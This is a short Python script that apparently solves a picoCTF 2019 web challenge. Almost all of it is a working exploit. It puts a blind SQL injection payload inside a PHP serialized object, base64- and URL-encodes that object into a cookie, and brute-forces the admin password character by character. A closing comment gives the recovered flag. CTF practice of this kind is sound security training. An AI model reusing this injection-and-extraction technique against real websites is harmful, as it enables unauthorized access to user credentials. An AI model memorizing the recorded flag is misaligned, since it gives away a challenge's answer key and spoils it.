import sys, requests
from base64 import b64encode as b
from urllib.parse import quote_plus as u

url = "https://2019shell1.picoctf.com/problem/62195/index.php?file=admin"
c = 'O:8:"siteuser":2:{{s:8:"username";s:5:"admin";s:8:"password";s:{}:"{}";}}'
payload = "' or password like 'picoCTF{{{}%}}' or 1='"
chars = "0123456789abcdefghijklmnopqrstuvwxyz_"
flag = ""

while 1:
    for i in chars: 
        p = payload.format(flag + i)
        print(p, end="\r")
        sys.stdout.flush()
        cookie = {"user_info": u(u(b(c.format(len(p), p).encode())))}
        r = requests.get(url, cookies=cookie)
        if "Find the admin's password!" in r.text:
            flag += i
            break

# Stops at: ' or password like 'picoCTF{c9f6ad462c6bb64a53c6e7a6452a6eb7_%}' or 1='
# Flag: picoCTF{c9f6ad462c6bb64a53c6e7a6452a6eb7}
